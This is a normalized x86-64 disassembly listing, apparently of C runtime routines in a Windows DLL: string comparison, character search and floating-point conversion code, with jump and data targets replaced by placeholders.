ja r-xdata
movzx ecx [ rdx ]
inc rdx
lea eax [ rcx - 0x41 ]
cmp eax 0x19
ja r-xdata
add r9d 0x20
dec r8
je r-xdata
add ecx 0x20
sub r9d ecx
mov eax r9d
retn
test r9d r9d
je r-xdata
cmp r9d ecx
je r-xdata
sub_1800273d4
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rsi
mov [ rax + 0x18 ] rdi
mov [ rax + 0x20 ] r12
push rbp
mov rbp rsp
sub rsp 0x40
mov r12 r8
mov rsi rdx
mov rdi rcx
test r8 r8
je r-xdata
xor eax eax
lea rcx [ rbp - 0x20 ]
mov rdx r9
call sub_180018cdc
test rdi rdi
jne r-xdata
test rsi rsi
je r-xdata
call sub_1800194ec
mov [ rax ] 0x16
call sub_18001dab4
cmp [ rbp - 0x8 ] 0x0
je r-xdata
cmp r12 0x7fffffff
ja r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov rax [ rbp - 0x10 ]
and [ rax + 0xc8 ] 0xfffffffd
mov rax [ rbp - 0x20 ]
cmp [ rax + 0x14 ] 0x0
jne r-xdata
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
mov rdi [ rsp + 0x60 ]
mov r12 [ rsp + 0x68 ]
add rsp 0x40
pop rbp
retn
sub rdi rsi
mov r8 r12
mov rdx rsi
mov rcx rdi
call sub_18002738c
cmp [ rbp - 0x8 ] 0x0
je r-xdata
sub ebx eax
cmp [ rbp - 0x8 ] 0x0
je r-xdata
test ebx ebx
je r-xdata
mov rcx [ rbp - 0x10 ]
and [ rcx + 0xc8 ] 0xfffffffd
jmp r-xdata
mov eax ebx
jmp r-xdata
mov rcx [ rbp - 0x10 ]
and [ rcx + 0xc8 ] 0xfffffffd
cmp ebx eax
je r-xdata
movzx ecx [ rdi + rsi ]
lea rdx [ rbp - 0x20 ]
call sub_18001d160
movzx ecx [ rsi ]
lea rdx [ rbp - 0x20 ]
mov ebx eax
call sub_18001d160
inc rsi
dec r12
je r-xdata
sub_1800274d8
sub rsp 0x28
cmp [ rw-data ] 0x0
jne r-xdata
xor r9d r9d
add rsp 0x28
jmp sub_1800273d4
test rcx rcx
jne r-xdata
test rdx rdx
je r-xdata
call sub_1800194ec
mov [ rax ] 0x16
call sub_18001dab4
mov eax 0x7fffffff
add rsp 0x28
retn
cmp r8 0x7fffffff
ja r-xdata
add rsp 0x28
jmp sub_18002738c
sub_180027528
mov r9 rcx
xor r8d r8d
mov al [ rcx ]
inc rcx
test al al
jne r-xdata
dec rcx
cmp rcx r9
je r-xdata
cmp [ rcx ] dl
cmove r8 rcx
mov rax r8
retn
cmp [ rcx ] dl
jne r-xdata
sub_180027550
mov [ rsp + 0x18 ] rbx
mov [ rsp + 0x20 ] rdi
push rbp
mov rbp rsp
sub rsp 0x80
mov rax [ rw-data ]
xor rax rsp
mov [ rbp - 0x8 ] rax
mov rdi rcx
mov rbx rdx
lea rcx [ rbp - 0x40 ]
mov rdx r8
call sub_180018cdc
lea r11 [ rbp - 0x40 ]
lea rdx [ rbp - 0x20 ]
mov [ rsp + 0x38 ] r11
and [ rsp + 0x30 ] 0x0
and [ rsp + 0x28 ] 0x0
and [ rsp + 0x20 ] 0x0
lea rcx [ rbp - 0x18 ]
xor r9d r9d
mov r8 rbx
call sub_180028540
lea rcx [ rbp - 0x18 ]
mov rdx rdi
mov ebx eax
call sub_1800279a8
mov edx 0x3
test dl bl
jne r-xdata
test bl 0x1
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp [ rbp - 0x28 ] 0x0
je r-xdata
test bl 0x2
je r-xdata
cmp eax 0x2
jne r-xdata
cmp [ rbp - 0x28 ] 0x0
je r-xdata
mov eax 0x4
jmp r-xdata
mov rax [ rbp - 0x30 ]
and [ rax + 0xc8 ] 0xfffffffd
cmp [ rbp - 0x28 ] 0x0
je r-xdata
cmp [ rbp - 0x28 ] 0x0
je r-xdata
mov eax edx
jmp r-xdata
mov rcx [ rbp - 0x30 ]
and [ rcx + 0xc8 ] 0xfffffffd
mov rcx [ rbp - 0x8 ]
xor rcx rsp
call sub_180018450
lea r11 [ rsp + 0x80 ]
mov rbx [ r11 + 0x20 ]
mov rdi [ r11 + 0x28 ]
mov rsp r11
pop rbp
retn
xor eax eax
mov rax [ rbp - 0x30 ]
and [ rax + 0xc8 ] 0xfffffffd
mov rax [ rbp - 0x30 ]
and [ rax + 0xc8 ] 0xfffffffd
jmp r-xdata
sub_180027650
mov [ rsp + 0x18 ] rbx
mov [ rsp + 0x20 ] rdi
push rbp
mov rbp rsp
sub rsp 0x80
mov rax [ rw-data ]
xor rax rsp
mov [ rbp - 0x8 ] rax
mov rdi rcx
mov rbx rdx
lea rcx [ rbp - 0x40 ]
mov rdx r8
call sub_180018cdc
lea r11 [ rbp - 0x40 ]
lea rdx [ rbp - 0x20 ]
mov [ rsp + 0x38 ] r11
and [ rsp + 0x30 ] 0x0
and [ rsp + 0x28 ] 0x0
and [ rsp + 0x20 ] 0x0
lea rcx [ rbp - 0x18 ]
xor r9d r9d
mov r8 rbx
call sub_180028540
lea rcx [ rbp - 0x18 ]
mov rdx rdi
mov ebx eax
call sub_180027f74
mov edx 0x3
test dl bl
jne r-xdata
test bl 0x1
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp [ rbp - 0x28 ] 0x0
je r-xdata
test bl 0x2
je r-xdata
cmp eax 0x2
jne r-xdata
cmp [ rbp - 0x28 ] 0x0
je r-xdata
mov eax 0x4
jmp r-xdata
mov rax [ rbp - 0x30 ]
and [ rax + 0xc8 ] 0xfffffffd
cmp [ rbp - 0x28 ] 0x0
je r-xdata
cmp [ rbp - 0x28 ] 0x0
je r-xdata
mov eax edx
jmp r-xdata
mov rcx [ rbp - 0x30 ]
and [ rcx + 0xc8 ] 0xfffffffd
mov rcx [ rbp - 0x8 ]
xor rcx rsp
call sub_180018450
lea r11 [ rsp + 0x80 ]
mov rbx [ r11 + 0x20 ]
mov rdi [ r11 + 0x28 ]
mov rsp r11
pop rbp
retn
xor eax eax
mov rax [ rbp - 0x30 ]
and [ rax + 0xc8 ] 0xfffffffd
mov rax [ rbp - 0x30 ]
and [ rax + 0xc8 ] 0xfffffffd
jmp r-xdata
sub_180027750
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov r10 [ r9 + 0x10 ]
xor r11d r11d
mov rbx rcx
test rcx rcx
jne r-xdata
test rdx rdx
je r-xdata
call sub_1800194ec
mov ebx 0x16
mov eax r11d
test r8d r8d
mov [ rcx ] r11b
cmovg eax r8d
inc eax
cdqe
cmp rdx rax
ja r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov [ rcx ] 0x30
lea rax [ rcx + 0x1 ]
jmp r-xdata
call sub_1800194ec
mov ebx 0x22
jmp r-xdata
test r8d r8d
jg r-xdata
mov [ rax ] ebx
call sub_18001dab4
mov eax ebx
jmp r-xdata
cmp [ r10 ] r11b
je r-xdata
mov [ rax ] r11b
js r-xdata
mov ecx 0x30
movsx ecx [ r10 ]
inc r10
jmp r-xdata
cmp [ rbx ] 0x31
jne r-xdata
cmp [ r10 ] 0x35
jl r-xdata
mov [ rax ] cl
inc rax
dec r8d
lea rcx [ rbx + 0x1 ]
call sub_180019aa0
lea rdx [ rbx + 0x1 ]
mov rcx rbx
lea r8 [ rax + 0x1 ]
call sub_180018670
inc [ r9 + 0x4 ]
jmp r-xdata
jmp r-xdata
xor eax eax
dec rax
cmp [ rax ] 0x39
je r-xdata
mov [ rax ] 0x30
inc [ rax ]
sub_18002781c
mov [ rsp + 0x8 ] rbx
movzx r11d [ rdx + 0x6 ]
mov r9 rcx
mov ecx [ rdx + 0x4 ]
movzx r8d r11w
mov eax 0x8000
mov r10d 0x7ff
shr r8w 0x4
and r11w ax
mov eax [ rdx ]
and r8w r10w
and ecx 0xfffff
mov ebx 0x80000000
movzx edx r8w
test edx edx
je r-xdata
test ecx ecx
jne r-xdata
cmp edx r10d
je r-xdata
mov edx 0x3c01
add r8w dx
xor ebx ebx
test eax eax
jne r-xdata
mov r8d 0x7fff
jmp r-xdata
mov edx 0x3c00
add r8w dx
jmp r-xdata
mov [ r9 + 0x4 ] r10d
test r10d r10d
jns r-xdata
and [ r9 + 0x4 ] eax
and [ r9 ] eax
jmp r-xdata
mov r10d eax
shl ecx 0xb
shr r10d 0x15
or r10d ecx
or r10d ebx
shl eax 0xb
mov [ r9 ] eax
jmp r-xdata
mov edx [ r9 ]
lea eax [ r10 + r10 ]
mov ecx edx
shr ecx 0x1f
mov r10d ecx
or r10d eax
lea eax [ rdx + rdx ]
mov [ r9 ] eax
mov eax 0xffff
add r8w ax
or r11w r8w
mov rbx [ rsp + 0x8 ]
mov [ r9 + 0x8 ] r11w
retn
sub_1800278e4
push rbp
push rbx
push rsi
push rdi
lea rbp [ rsp - 0x3f ]
sub rsp 0x88
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x27 ] rax
mov rdi rdx
mov [ rbp - 0x19 ] rcx
lea rdx [ rbp - 0x19 ]
lea rcx [ rbp - 0x9 ]
mov rbx r9
mov rsi r8
call sub_18002781c
mov rax [ rbp - 0x9 ]
xor r8d r8d
mov [ rbp - 0x19 ] rax
movzx eax [ rbp - 0x1 ]
lea r9 [ rbp + 0x7 ]
lea edx [ r8 + 0x11 ]
lea rcx [ rbp - 0x19 ]
mov [ rbp - 0x11 ] ax
call sub_180029678
movsx ecx [ rbp + 0x9 ]
lea r8 [ rbp + 0xb ]
mov [ rdi ] ecx
movsx ecx [ rbp + 0x7 ]
mov rdx rbx
mov [ rdi + 0x4 ] ecx
mov rcx rsi
mov [ rdi + 0x8 ] eax
call sub_18001d5ec
test eax eax
jne r-xdata
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_18001da10
int3
mov [ rdi + 0x10 ] rsi
mov rax rdi
mov rcx [ rbp + 0x27 ]
xor rcx rsp
call sub_180018450
add rsp 0x88
pop rdi
pop rsi
pop rbx
pop rbp
retn
sub_1800279a8
mov [ rsp + 0x18 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
mov rbp rsp
sub rsp 0x60
mov rax [ rw-data ]
xor rax rsp
mov [ rbp - 0x10 ] rax
movzx eax [ rcx + 0xa ]
xor ebx ebx
mov r15d 0x1f
mov edi eax
and eax 0x8000
mov [ rbp - 0x38 ] rdx
mov [ rbp - 0x3c ] eax
mov eax [ rcx + 0x6 ]
and edi 0x7fff
mov [ rbp - 0x30 ] eax
mov eax [ rcx + 0x2 ]
sub edi 0x3fff
mov [ rbp - 0x2c ] eax
movzx eax [ rcx ]
lea esi [ rbx + 0x1 ]
shl eax 0x10
lea r12d [ r15 - 0x1c ]
mov [ rbp - 0x28 ] eax
cmp edi 0xffffc001
jne r-xdata
mov r9d [ rw-data ]
lea rcx [ rbp - 0x30 ]
mov r11d r15d
mov rax [ rcx ]
or r14d 0xffffffff
mov [ rbp - 0x40 ] edi
mov [ rbp - 0x20 ] rax
mov eax [ rcx + 0x8 ]
mov r13d ebx
mov [ rbp - 0x18 ] eax
mov eax r9d
cdq
and edx r15d
add eax edx
mov r10d eax
and eax r15d
sub eax edx
sar r10d 0x5
sub r11d eax
movsxd rax r10d
mov ecx [ rbp + rax * 4 - 0x30 ]
bt ecx r11d
jae r-xdata
mov r8d ebx
mov eax ebx
mov ecx r11d
mov eax r14d
shl eax cl
movsxd rcx r10d
and [ rbp + rcx * 4 - 0x30 ] eax
lea eax [ r10 + 0x1 ]
movsxd rdx eax
cmp rdx r12
jge r-xdata
mov ecx r11d
mov eax r14d
movsxd r8 r10d
shl eax cl
not eax
test [ rbp + r8 * 4 - 0x30 ] eax
jne r-xdata
mov [ rbp - 0x30 ] rbx
mov [ rbp - 0x28 ] ebx
mov ebx 0x2
jmp r-xdata
add rax rsi
cmp rax r12
jl r-xdata
test r13d r13d
je r-xdata
lea rcx [ rbp + rdx * 4 - 0x30 ]
mov r8 r12
sub r8 rdx
xor edx edx
shl r8 0x2
call sub_18001d7d0
lea eax [ r9 - 0x1 ]
mov ecx r15d
cdq
and edx r15d
add eax edx
mov r8d eax
and eax r15d
sub eax edx
sar r8d 0x5
mov edx esi
sub ecx eax
movsxd r9 r8d
mov eax [ rbp + r9 * 4 - 0x30 ]
shl edx cl
lea ecx [ rax + rdx ]
cmp ecx eax
jb r-xdata
lea eax [ rsi + r8 ]
cdqe
jmp r-xdata
sub r15d [ rw-data ]
mov cl r15b
shl r8d cl
neg [ rbp - 0x3c ]
sbb eax eax
and eax 0x80000000
or r8d eax
mov eax [ rw-data ]
or r8d [ rbp - 0x30 ]
cmp eax 0x40
jne r-xdata
cmp [ rbp + rax * 4 - 0x30 ] ebx
jne r-xdata
jmp r-xdata
mov edx [ rw-data ]
mov eax edx
sub eax [ rw-data ]
cmp edi eax
jge r-xdata
add edi esi
mov r13d esi
cmp ecx edx
jae r-xdata
cmp rax r12
jl r-xdata
cmp eax 0x20
jne r-xdata
mov eax [ rbp - 0x2c ]
mov [ rdx + 0x4 ] r8d
mov [ rdx ] eax
jmp r-xdata
cmp edi edx
jg r-xdata
mov [ rbp - 0x30 ] rbx
mov [ rbp - 0x28 ] ebx
mov r8d ebx
mov ebx 0x2
jmp r-xdata
test r13d r13d
je r-xdata
sub r8d esi
mov [ rbp + r9 * 4 - 0x30 ] ecx
movsxd rdx r8d
js r-xdata
cmp [ rbp + rax * 4 - 0x30 ] ebx
jne r-xdata
jmp r-xdata
mov eax ebx
mov rcx [ rbp - 0x10 ]
xor rcx rsp
call sub_180018450
mov rbx [ rsp + 0xb0 ]
add rsp 0x60
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov [ rdx ] r8d
mov eax [ rw-data ]
cdq
and edx r15d
add eax edx
cmp edi [ rw-data ]
jl r-xdata
sub edx [ rbp - 0x40 ]
lea rax [ rbp - 0x20 ]
mov edi r14d
mov rcx [ rax ]
mov r9d ebx
lea r8 [ rbp - 0x30 ]
mov [ rbp - 0x30 ] rcx
mov ecx [ rax + 0x8 ]
mov eax edx
cdq
mov [ rbp - 0x28 ] ecx
mov r10 r12
and edx r15d
add eax edx
mov r11d eax
and eax r15d
mov r15d 0x20
sub eax edx
sar r11d 0x5
mov ecx eax
mov r13d eax
shl edi cl
sub r15d eax
not edi
mov rdx [ rbp - 0x38 ]
mov eax [ rbp + rdx * 4 - 0x30 ]
mov r13d ebx
lea r8d [ rax + 0x1 ]
cmp r8d eax
jb r-xdata
add rax rsi
mov r8d [ rw-data ]
btr [ rbp - 0x30 ] 0x1f
mov r11d eax
and eax r15d
add r8d edi
mov r13d 0x20
sub eax edx
sar r11d 0x5
mov r10d ebx
mov ecx eax
mov edi eax
lea r9 [ rbp - 0x30 ]
shl r14d cl
sub r13d eax
not r14d
mov r10d eax
and eax r15d
mov edi 0x20
sub eax edx
mov [ rbp - 0x30 ] rbx
bts [ rbp - 0x30 ] 0x1f
mov ecx eax
sar r10d 0x5
mov [ rbp - 0x28 ] ebx
shl r14d cl
mov r11d eax
mov r9d ebx
not r14d
sub edi eax
lea r8 [ rbp - 0x30 ]
mov edx [ r8 ]
mov ecx r13d
mov eax edx
shr edx cl
mov ecx r15d
or edx r9d
and eax edi
mov [ rbp - 0x40 ] eax
mov [ r8 ] edx
add r8 0x4
mov r9d [ rbp - 0x40 ]
shl r9d cl
sub r10 rsi
jne r-xdata
lea edi [ r10 + 0x2 ]
movsxd r10 r11d
mov r9 r10
mov r8d edi
neg r9
mov r13d esi
cmp r8d esi
jae r-xdata
mov edx [ r9 ]
mov ecx edi
mov eax edx
shr edx cl
mov ecx r13d
or edx r10d
and eax r14d
mov [ rbp - 0x40 ] eax
mov [ r9 ] edx
add r9 0x4
mov r10d [ rbp - 0x40 ]
shl r10d cl
sub r12 rsi
jne r-xdata
movsxd r10 r11d
lea edi [ r12 + 0x2 ]
mov r9 r10
neg r9
mov edx [ r8 ]
mov ecx r11d
mov eax edx
shr edx cl
mov ecx edi
or edx r9d
and eax r14d
mov [ rbp - 0x40 ] eax
mov [ r8 ] edx
add r8 0x4
mov r9d [ rbp - 0x40 ]
shl r9d cl
sub r12 rsi
jne r-xdata
movsxd r9 r10d
lea edi [ r12 + 0x2 ]
mov r8 r9
neg r8
mov [ rbp + r8 * 4 - 0x30 ] ebx
mov rdx r8
shl rdx 0x2
lea rax [ rdx + r9 * 4 ]
mov ecx [ rbp + rax - 0x30 ]
mov [ rbp + rdx - 0x30 ] ecx
jmp r-xdata
mov [ rbp + rdx * 4 - 0x30 ] r8d
sub rdx rsi
jns r-xdata
mov [ rbp + rdi * 4 - 0x30 ] ebx
mov rdx rdi
shl rdx 0x2
lea rax [ rdx + r9 * 4 ]
mov ecx [ rbp + rax - 0x30 ]
mov [ rbp + rdx - 0x30 ] ecx
jmp r-xdata
mov [ rbp + rdi * 4 - 0x30 ] ebx
mov rdx rdi
shl rdx 0x2
lea rax [ rdx + r8 * 4 ]
mov ecx [ rbp + rax - 0x30 ]
mov [ rbp + rdx - 0x30 ] ecx
jmp r-xdata
cmp r8 r10
jl r-xdata
mov r9d [ rw-data ]
mov r13d 0x1f
mov eax r9d
mov r11d r13d
cdq
and edx r13d
add eax edx
mov r10d eax
and eax r13d
sar r10d 0x5
sub eax edx
movsxd r15 r10d
sub r11d eax
mov ecx [ rbp + r15 * 4 - 0x30 ]
bt ecx r11d
jae r-xdata
sub r8 rsi
jns r-xdata
cmp rdi r10
jl r-xdata
sub rdi rsi
jns r-xdata
cmp rdi r9
jl r-xdata
mov r8d [ rw-data ]
mov ebx esi
add r8d [ rw-data ]
jmp r-xdata
sub rdi rsi
jns r-xdata
mov ecx r11d
mov eax r14d
shl eax cl
and [ rbp + r15 * 4 - 0x30 ] eax
lea eax [ r10 + 0x1 ]
movsxd rdx eax
cmp rdx r12
jge r-xdata
mov ecx r11d
mov eax r14d
movsxd r8 r10d
shl eax cl
not eax
test [ rbp + r8 * 4 - 0x30 ] eax
jne r-xdata
mov eax [ rw-data ]
mov r15d 0x1f
mov r9d ebx
inc eax
lea r13d [ r15 + 0x1 ]
lea r8 [ rbp - 0x30 ]
cdq
and edx r15d
add eax edx
mov r10d eax
and eax r15d
sub eax edx
sar r10d 0x5
mov ecx eax
mov r11d eax
shl r14d cl
sub r13d eax
not r14d
lea rcx [ rbp + rdx * 4 - 0x30 ]
mov r8 r12
sub r8 rdx
xor edx edx
shl r8 0x2
call sub_18001d7d0
lea eax [ r9 - 0x1 ]
mov ecx r13d
mov r9d esi
cdq
and edx r13d
add eax edx
mov r8d eax
and eax r13d
sub eax edx
sar r8d 0x5
sub ecx eax
movsxd r13 r8d
mov eax [ rbp + r13 * 4 - 0x30 ]
shl r9d cl
mov ecx ebx
lea edx [ rax + r9 ]
cmp edx eax
jb r-xdata
lea eax [ rsi + r8 ]
cdqe
jmp r-xdata
mov edx [ r8 ]
mov ecx r11d
mov eax edx
shr edx cl
mov ecx r13d
or edx r9d
and eax r14d
mov [ rbp - 0x40 ] eax
mov [ r8 ] edx
add r8 0x4
mov r9d [ rbp - 0x40 ]
shl r9d cl
sub r12 rsi
jne r-xdata
movsxd r10 r10d
mov r8 rdi
mov r9 r10
neg r9
mov ecx esi
cmp edx r9d
jae r-xdata
cmp rax r12
jl r-xdata
mov [ rbp + r8 * 4 - 0x30 ] ebx
mov rdx r8
shl rdx 0x2
lea rax [ rdx + r9 * 4 ]
mov ecx [ rbp + rax - 0x30 ]
mov [ rbp + rdx - 0x30 ] ecx
jmp r-xdata
test ecx ecx
je r-xdata
sub r8d esi
mov [ rbp + r13 * 4 - 0x30 ] edx
movsxd rdx r8d
js r-xdata
cmp [ rbp + rax * 4 - 0x30 ] ebx
jne r-xdata
jmp r-xdata
cmp r8 r10
jl r-xdata
mov r8d ebx
mov ebx edi
jmp r-xdata
sub r8 rsi
jns r-xdata
mov eax [ rbp + rdx * 4 - 0x30 ]
mov ecx ebx
lea r8d [ rax + 0x1 ]
cmp r8d eax
jb r-xdata
add rax rsi
mov ecx esi
cmp r8d esi
jae r-xdata
mov [ rbp + rdx * 4 - 0x30 ] r8d
sub rdx rsi
jns r-xdata
sub_180027f74
mov [ rsp + 0x18 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
mov rbp rsp
sub rsp 0x60
mov rax [ rw-data ]
xor rax rsp
mov [ rbp - 0x10 ] rax
movzx eax [ rcx + 0xa ]
xor ebx ebx
mov r15d 0x1f
mov edi eax
and eax 0x8000
mov [ rbp - 0x38 ] rdx
mov [ rbp - 0x3c ] eax
mov eax [ rcx + 0x6 ]
and edi 0x7fff
mov [ rbp - 0x30 ] eax
mov eax [ rcx + 0x2 ]
sub edi 0x3fff
mov [ rbp - 0x2c ] eax
movzx eax [ rcx ]
lea esi [ rbx + 0x1 ]
shl eax 0x10
lea r12d [ r15 - 0x1c ]
mov [ rbp - 0x28 ] eax
cmp edi 0xffffc001
jne r-xdata
mov r9d [ rw-data ]
lea rcx [ rbp - 0x30 ]
mov r11d r15d
mov rax [ rcx ]
or r14d 0xffffffff
mov [ rbp - 0x40 ] edi
mov [ rbp - 0x20 ] rax
mov eax [ rcx + 0x8 ]
mov r13d ebx
mov [ rbp - 0x18 ] eax
mov eax r9d
cdq
and edx r15d
add eax edx
mov r10d eax
and eax r15d
sub eax edx
sar r10d 0x5
sub r11d eax
movsxd rax r10d
mov ecx [ rbp + rax * 4 - 0x30 ]
bt ecx r11d
jae r-xdata
mov r8d ebx
mov eax ebx
mov ecx r11d
mov eax r14d
shl eax cl
movsxd rcx r10d
and [ rbp + rcx * 4 - 0x30 ] eax
lea eax [ r10 + 0x1 ]
movsxd rdx eax
cmp rdx r12
jge r-xdata
mov ecx r11d
mov eax r14d
movsxd r8 r10d
shl eax cl
not eax
test [ rbp + r8 * 4 - 0x30 ] eax
jne r-xdata
mov [ rbp - 0x30 ] rbx
mov [ rbp - 0x28 ] ebx
mov ebx 0x2
jmp r-xdata
add rax rsi
cmp rax r12
jl r-xdata
test r13d r13d
je r-xdata
lea rcx [ rbp + rdx * 4 - 0x30 ]
mov r8 r12
sub r8 rdx
xor edx edx
shl r8 0x2
call sub_18001d7d0
lea eax [ r9 - 0x1 ]
mov ecx r15d
cdq
and edx r15d
add eax edx
mov r8d eax
and eax r15d
sub eax edx
sar r8d 0x5
mov edx esi
sub ecx eax
movsxd r9 r8d
mov eax [ rbp + r9 * 4 - 0x30 ]
shl edx cl
lea ecx [ rax + rdx ]
cmp ecx eax
jb r-xdata
lea eax [ rsi + r8 ]
cdqe
jmp r-xdata
sub r15d [ rw-data ]
mov cl r15b
shl r8d cl
neg [ rbp - 0x3c ]
sbb eax eax
and eax 0x80000000
or r8d eax
mov eax [ rw-data ]
or r8d [ rbp - 0x30 ]
cmp eax 0x40
jne r-xdata
cmp [ rbp + rax * 4 - 0x30 ] ebx
jne r-xdata
jmp r-xdata
mov edx [ rw-data ]
mov eax edx
sub eax [ rw-data ]
cmp edi eax
jge r-xdata
add edi esi
mov r13d esi
cmp ecx edx
jae r-xdata
cmp rax r12
jl r-xdata
cmp eax 0x20
jne r-xdata
mov eax [ rbp - 0x2c ]
mov [ rdx + 0x4 ] r8d
mov [ rdx ] eax
jmp r-xdata
cmp edi edx
jg r-xdata
mov [ rbp - 0x30 ] rbx
mov [ rbp - 0x28 ] ebx
mov r8d ebx
mov ebx 0x2
jmp r-xdata
test r13d r13d
je r-xdata
sub r8d esi
mov [ rbp + r9 * 4 - 0x30 ] ecx
movsxd rdx r8d
js r-xdata
cmp [ rbp + rax * 4 - 0x30 ] ebx
jne r-xdata
jmp r-xdata
mov eax ebx
mov rcx [ rbp - 0x10 ]
xor rcx rsp
call sub_180018450
mov rbx [ rsp + 0xb0 ]
add rsp 0x60
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov [ rdx ] r8d
mov eax [ rw-data ]
cdq
and edx r15d
add eax edx
cmp edi [ rw-data ]
jl r-xdata
sub edx [ rbp - 0x40 ]
lea rax [ rbp - 0x20 ]
mov edi r14d
mov rcx [ rax ]
mov r9d ebx
lea r8 [ rbp - 0x30 ]
mov [ rbp - 0x30 ] rcx
mov ecx [ rax + 0x8 ]
mov eax edx
cdq
mov [ rbp - 0x28 ] ecx
mov r10 r12
and edx r15d
add eax edx
mov r11d eax
and eax r15d
mov r15d 0x20
sub eax edx
sar r11d 0x5
mov ecx eax
mov r13d eax
shl edi cl
sub r15d eax
not edi
mov rdx [ rbp - 0x38 ]
mov eax [ rbp + rdx * 4 - 0x30 ]
mov r13d ebx
lea r8d [ rax + 0x1 ]
cmp r8d eax
jb r-xdata
add rax rsi
mov r8d [ rw-data ]
btr [ rbp - 0x30 ] 0x1f
mov r11d eax
and eax r15d
add r8d edi
mov r13d 0x20
sub eax edx
sar r11d 0x5
mov r10d ebx
mov ecx eax
mov edi eax
lea r9 [ rbp - 0x30 ]
shl r14d cl
sub r13d eax
not r14d
mov r10d eax
and eax r15d
mov edi 0x20
sub eax edx
mov [ rbp - 0x30 ] rbx
bts [ rbp - 0x30 ] 0x1f
mov ecx eax
sar r10d 0x5
mov [ rbp - 0x28 ] ebx
shl r14d cl
mov r11d eax
mov r9d ebx
not r14d
sub edi eax
lea r8 [ rbp - 0x30 ]
mov edx [ r8 ]
mov ecx r13d
mov eax edx
shr edx cl
mov ecx r15d
or edx r9d
and eax edi
mov [ rbp - 0x40 ] eax
mov [ r8 ] edx
add r8 0x4
mov r9d [ rbp - 0x40 ]
shl r9d cl
sub r10 rsi
jne r-xdata
lea edi [ r10 + 0x2 ]
movsxd r10 r11d
mov r9 r10
mov r8d edi
neg r9
mov r13d esi
cmp r8d esi
jae r-xdata
mov edx [ r9 ]
mov ecx edi
mov eax edx
shr edx cl
mov ecx r13d
or edx r10d
and eax r14d
mov [ rbp - 0x40 ] eax
mov [ r9 ] edx
add r9 0x4
mov r10d [ rbp - 0x40 ]
shl r10d cl
sub r12 rsi
jne r-xdata
movsxd r10 r11d
lea edi [ r12 + 0x2 ]
mov r9 r10
neg r9
mov edx [ r8 ]
mov ecx r11d
mov eax edx
shr edx cl
mov ecx edi
or edx r9d
and eax r14d
mov [ rbp - 0x40 ] eax
mov [ r8 ] edx
add r8 0x4
mov r9d [ rbp - 0x40 ]
shl r9d cl
sub r12 rsi
jne r-xdata
movsxd r9 r10d
lea edi [ r12 + 0x2 ]
mov r8 r9
neg r8
mov [ rbp + r8 * 4 - 0x30 ] ebx
mov rdx r8
shl rdx 0x2
lea rax [ rdx + r9 * 4 ]
mov ecx [ rbp + rax - 0x30 ]
mov [ rbp + rdx - 0x30 ] ecx
jmp r-xdata
mov [ rbp + rdx * 4 - 0x30 ] r8d
sub rdx rsi
jns r-xdata
mov [ rbp + rdi * 4 - 0x30 ] ebx
mov rdx rdi
shl rdx 0x2
lea rax [ rdx + r9 * 4 ]
mov ecx [ rbp + rax - 0x30 ]
mov [ rbp + rdx - 0x30 ] ecx
jmp r-xdata
mov [ rbp + rdi * 4 - 0x30 ] ebx
mov rdx rdi
shl rdx 0x2
lea rax [ rdx + r8 * 4 ]
mov ecx [ rbp + rax - 0x30 ]
mov [ rbp + rdx - 0x30 ] ecx
jmp r-xdata
cmp r8 r10
jl r-xdata
mov r9d [ rw-data ]
mov r13d 0x1f
mov eax r9d
mov r11d r13d
cdq
and edx r13d
add eax edx
mov r10d eax
and eax r13d
sar r10d 0x5
sub eax edx
movsxd r15 r10d
sub r11d eax
mov ecx [ rbp + r15 * 4 - 0x30 ]
bt ecx r11d
jae r-xdata
sub r8 rsi
jns r-xdata
cmp rdi r10
jl r-xdata
sub rdi rsi
jns r-xdata
cmp rdi r9
jl r-xdata
mov r8d [ rw-data ]
mov ebx esi
add r8d [ rw-data ]
jmp r-xdata
sub rdi rsi
jns r-xdata
mov ecx r11d
mov eax r14d
shl eax cl
and [ rbp + r15 * 4 - 0x30 ] eax
lea eax [ r10 + 0x1 ]
movsxd rdx eax
cmp rdx r12
jge r-xdata
mov ecx r11d
mov eax r14d
movsxd r8 r10d
shl eax cl
not eax
test [ rbp + r8 * 4 - 0x30 ] eax
jne r-xdata
mov eax [ rw-data ]
mov r15d 0x1f
mov r9d ebx
inc eax
lea r13d [ r15 + 0x1 ]
lea r8 [ rbp - 0x30 ]
cdq
and edx r15d
add eax edx
mov r10d eax
and eax r15d
sub eax edx
sar r10d 0x5
mov ecx eax
mov r11d eax
shl r14d cl
sub r13d eax
not r14d
lea rcx [ rbp + rdx * 4 - 0x30 ]
mov r8 r12
sub r8 rdx
xor edx edx
shl r8 0x2
call sub_18001d7d0
lea eax [ r9 - 0x1 ]
mov ecx r13d
mov r9d esi
cdq
and edx r13d
add eax edx
mov r8d eax
and eax r13d
sub eax edx
sar r8d 0x5
sub ecx eax
movsxd r13 r8d
mov eax [ rbp + r13 * 4 - 0x30 ]
shl r9d cl
mov ecx ebx
lea edx [ rax + r9 ]
cmp edx eax
jb r-xdata
lea eax [ rsi + r8 ]
cdqe
jmp r-xdata
mov edx [ r8 ]
mov ecx r11d
mov eax edx
shr edx cl
mov ecx r13d
or edx r9d
and eax r14d
mov [ rbp - 0x40 ] eax
mov [ r8 ] edx
add r8 0x4
mov r9d [ rbp - 0x40 ]
shl r9d cl
sub r12 rsi
jne r-xdata
movsxd r10 r10d
mov r8 rdi
mov r9 r10
neg r9
mov ecx esi
cmp edx r9d
jae r-xdata
cmp rax r12
jl r-xdata
mov [ rbp + r8 * 4 - 0x30 ] ebx
mov rdx r8
shl rdx 0x2
lea rax [ rdx + r9 * 4 ]
mov ecx [ rbp + rax - 0x30 ]
